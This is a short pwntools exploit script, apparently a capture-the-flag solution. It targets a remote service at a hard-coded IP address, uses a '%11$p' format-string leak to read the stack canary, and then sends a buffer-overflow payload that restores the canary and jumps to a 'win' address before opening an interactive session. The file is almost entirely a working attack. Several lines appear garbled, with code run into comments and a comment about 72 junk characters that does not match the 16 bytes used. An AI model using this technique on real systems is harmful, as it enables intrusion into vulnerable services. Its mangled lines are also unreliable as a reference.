from pwn import *

p = remote('107.191.51.129',5001)
# p = process("./string0")

payload = b'A' *16 # To overwrite buffer with 72 junk char


win = p32(0x0804920f) # Win address
ret = p32(0x08049342) # ret addressp.recv(1024)
print(p.recvline())

p.sendline(b'%11$p')
# p.sendline(b'%63$p') # 15th argument when leakedcanary = int(p.recvline(), 16) # Getting the canary value and storing in variable
# print(p.recvline())
canary = int(p.recvline(), 16)
log.info(f'Canary: {hex(canary)}') # Storing as hexpayload = overwrite # Overwrite the buffer to reach the canary
print(p.recvline())

# payload += b'A' * 4
payload += p32(canary) # Sending in the correct canary
payload += b'A' * 12  # Filling up spaces
# payload += ret # To avoid movaps
payload += win # Win address
print(payload)
# p.recvuntil(b"fowl?") # After second prompt
# print(p.recvline())
p.sendline(payload)
# print(p.recvline())
p.interactive()